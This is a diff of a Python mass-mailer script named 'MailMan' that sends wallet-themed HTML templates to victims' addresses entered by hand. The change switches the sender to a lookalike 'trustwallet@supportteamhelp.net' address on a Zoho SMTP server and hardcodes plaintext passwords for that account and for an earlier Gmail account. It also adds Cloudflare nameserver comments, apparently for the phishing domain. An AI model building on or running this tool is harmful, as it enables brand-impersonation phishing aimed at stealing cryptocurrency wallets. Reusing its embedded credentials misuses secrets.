@@ -42,8 +42,8 @@ def load_html_template(wallet_name):
 def send(wallet, email):
     """Send email with HTML template"""
     try:
-        sender_email = "cybergoat784@gmail.com"
-        sender_password = "czhv hwwq rfgt gmym"
+        sender_email = "trustwallet@supportteamhelp.net"
+        sender_password = "FoolishGuy123$$"
         
         # Load HTML template
         html_content = load_html_template(wallet)
@@ -60,10 +60,8 @@ def send(wallet, email):
         html_part = MIMEText(html_content, 'html')
         msg.attach(html_part)
         
-        # Send email
-        #with smtplib.SMTP('smtpout.secureserver.net', 587) as server:
-        with smtplib.SMTP('smtp.gmail.com', 587) as server:
-            server.starttls()
+        # Send email using SSL
+        with smtplib.SMTP_SSL('smtppro.zoho.com', 465) as server:
             server.login(sender_email, sender_password)
             server.send_message(msg)
         
@@ -73,12 +71,11 @@ def send(wallet, email):
         print(f"Error sending email: {e}")
         return False
 
-
 def main():
     print("=== MailMan ===\n")
     
     emails = []
-    for i in range(1, 11):
+    for i in range(1, 2):
         email = input(f"Enter Client Email {i}: ")
         
         if '@' not in email:
@@ -117,7 +114,7 @@ def main():
 
 
 if __name__ == "__main__":
+    main()#
 
-    main()
-
-
+#dimitris.ns.cloudflare.com
+#gail.ns.cloudflare.com
